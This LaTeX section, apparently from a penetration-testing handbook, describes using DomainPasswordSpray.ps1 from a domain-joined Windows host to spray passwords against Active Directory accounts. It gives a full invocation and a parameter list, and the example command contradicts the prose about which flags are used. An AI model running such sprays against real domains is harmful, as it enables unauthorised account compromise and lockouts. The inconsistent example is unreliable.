\section{DomainPasswordSpray.ps1}
\subsection*{Introduction}
\label{tool:domainpasswordspray}

From a foothold on a domain-joined Windows host, the
\href{https://github.com/dafthack/DomainPasswordSpray}{DomainPassword-
Spray} tool is highly effective. With an account authenticated to the domain,
the tool will automatically generate a user list from Active Directory, query
the domain password policy, and exclude user accounts within one attempt of
locking out.

    I can also be supplied a user list if the spray is palyed on a Windows host
but not authenticated to the domain.

    There are several options available to us with the tool. Since the host is
domain-joined, we will skip the \verb+-UserList+ flag and let the tool generate a list
for us. Weâ€™ll supply the \verb+Password+ flag and one single password and then use
the \verb+-OutFile+ flag to write our output to a file for later use.
\begin{verbatim}
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray \
    -UserList users.txt \
    -Domain domain-name \
    -PasswordList passlist.txt \
    -OutFile sprayed-creds.txt \
    -ErrorAction SilentlyContinue
\end{verbatim}


\begin{itemize}
    \item \verb+UserList+          - Optional UserList parameter. This will be generated automatically if not specified.
    \item \verb+Password+          - A single password that will be used to perform the password spray.
    \item \verb+PasswordList+      - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
    \item \verb+OutFile+           - A file to output the results to.
    \item \verb+Domain+            - A domain to spray against.
    \item \verb+Force+             - Forces the spray to continue without prompting for confirmation.
\end{itemize}

\subsection*{links}
